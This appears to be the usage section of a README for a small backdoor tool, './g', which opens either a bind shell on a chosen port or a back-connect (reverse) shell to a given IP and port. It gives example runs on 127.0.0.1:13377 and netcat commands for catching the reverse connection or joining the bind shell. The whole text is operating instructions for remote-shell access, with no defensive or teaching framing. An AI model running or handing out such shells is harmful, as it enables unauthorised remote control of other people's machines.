## Commands
```bash
$ ./g
Bind Shell Usage: ./g port
Back Connect Usage: ./g ip port
$
```
## Example Usage
Backconnect:
```bash
$ ./g 127.0.0.1 13377
```
Bind Shell:
```bash
$ ./g 13377
```
## Recieving a Connection with Netcat
Recieving a backconnect:
```bash
$ nc -vlp port
```
Connecting to a bind Shell:
```bash
$ nc host port
```
